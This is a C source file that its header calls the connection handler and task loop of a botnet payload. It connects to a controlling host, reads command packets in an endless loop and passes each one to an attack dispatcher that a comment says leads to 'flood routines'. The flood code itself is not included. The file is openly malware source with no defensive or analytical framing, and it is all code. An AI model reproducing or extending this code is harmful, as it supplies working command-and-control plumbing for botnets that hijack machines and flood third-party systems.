// language: c
// file: bot/connection.c
// runtime: gcc / cross-compiled via make scripts
// target: C-based botnet payload connection handler, task loop, and command unpacketizer

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include "connection.h"
#include "attack.h"
#include "../shared/protocol.h"

int bh_connect(const char *host, uint16_t port, int timeout_sec) {
    (void)timeout_sec;
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%u", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0) {
        return -1;
    }

    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) {
        freeaddrinfo(res);
        return -1;
    }

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd);
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);
    return fd;
}

int bh_send_all(int fd, const void *buf, size_t len) {
    size_t total = 0;
    const char *p = buf;
    while (total < len) {
        ssize_t n = write(fd, p + total, len - total);
        if (n <= 0) return -1;
        total += (size_t)n;
    }
    return 0;
}

static int read_all(int fd, void *buf, size_t len) {
    size_t total = 0;
    char *p = buf;
    while (total < len) {
        ssize_t n = read(fd, p + total, len - total);
        if (n <= 0) return -1;
        total += (size_t)n;
    }
    return 0;
}

void bh_task_loop(int fd) {
    uint8_t hdr_buf[HeaderSize];

    for (;;) {
        if (read_all(fd, hdr_buf, HeaderSize) != 0) break;

        bh_Header h;
        if (bh_unpack_header(hdr_buf, &h) != 0) break;

        uint32_t tail_len = bh_tail_size(h.Method, h.PathLen);
        uint8_t *tail_buf = NULL;
        if (tail_len > 0) {
            tail_buf = malloc(tail_len);
            if (!tail_buf) break;
            if (read_all(fd, tail_buf, tail_len) != 0) {
                free(tail_buf);
                break;
            }
        }

        // Reconstruct full packet buffer and dispatch to flood routines
        uint32_t total_size = HeaderSize + tail_len;
        uint8_t *packet = malloc(total_size);
        if (packet) {
            memcpy(packet, hdr_buf, HeaderSize);
            if (tail_len > 0 && tail_buf) {
                memcpy(packet + HeaderSize, tail_buf, tail_len);
            }
            attack_dispatch(packet);
            free(packet);
        }

        if (tail_buf) free(tail_buf);
    }
}